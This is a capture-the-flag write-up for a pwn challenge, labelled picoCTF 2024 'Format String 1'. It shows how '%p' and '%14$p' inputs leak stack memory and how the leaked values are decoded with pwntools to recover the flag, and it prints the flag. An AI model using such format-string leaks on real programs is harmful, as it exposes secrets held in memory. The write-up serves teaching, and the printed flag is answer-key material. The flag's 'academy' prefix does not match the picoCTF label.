## CTF: picoCTF 2024

Challenge: Format String 1

Points: 15

Category: pwn

Difficulty: Intermediate

## Instructions

Patrick and Sponge Bob were really happy with those orders you made for them, but now they're curious about the secret menu. Find it, and along the way, maybe you'll find something else of interest!

## Solution

This challenge takes us through the most basic format string vulnerability. It's important to understand before you get to more advanced attacks.

We start with a binary called *format-string-1*. Check what kind of file it is and what protections it has.

```bash
$ file format-string-1
format-string-1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped

$ checksec format-string-1
[*] '/home/shinigami/DrBrown/format-string-1'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

64-bit executable, not stripped, and PIE is not enabled. Run the binary — it needs three files: secret-menu-item-1, secret-menu-item-2, and flag.txt. Create them. The program takes input and prints it back:

```bash
$ ./format-string-1
Give me your order and I'll read it back to you:
aaa
Here's your order: aaa
Bye!
```

Whenever input gets printed back, try format strings. A format string vulnerability is when the developer doesn't check input and prints it directly. If you give printf format strings without variables, it reads from registers (calling convention order) then the stack. This can leak addresses or secrets.

In radare2, the program opens a file and uses fgets to write it onto the stack. We can leak it. Fuzz with `%p`:

```bash
$ ./format-string-1
Give me your order and I'll read it back to you:
%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|...
Here's your order: 0x7ffe21ccb960|(nil)|(nil)|...|0xa67616c665f796d|...
```

Position 14 looks like our flag. Narrow it down:

```bash
Give me your order and I'll read it back to you:
%14$p
Here's your order: 0xa67616c665f796d
```

The endianness is swapped. Use pwntools to fix:

```python
>>> print(p64(0xa67616c665f796d))
b'my_flag\n'
```

Connect to the remote server and extract the full flag byte by byte from multiple stack positions, decoding each with p64:

```python
>>> newstring = b""
>>> newstring += p64(0x7b796d6564616361)
>>> newstring += p64(0x355f31346d316e34)
>>> newstring += p64(0x3478345f33317937)
>>> newstring += p64(0x31395f673431665f)
>>> newstring += p64(0x7d646539656166)
>>> print(newstring)
b'academy{4n1m41_57y13_4x4_f14g_91fae9ed}\x00'
```

## Flag

```
academy{4n1m41_57y13_4x4_f14g_91fae9ed}
```

## Mitigation

Don't have a format string vulnerability by taking the user's input directly. Sanitize and check for size properly.
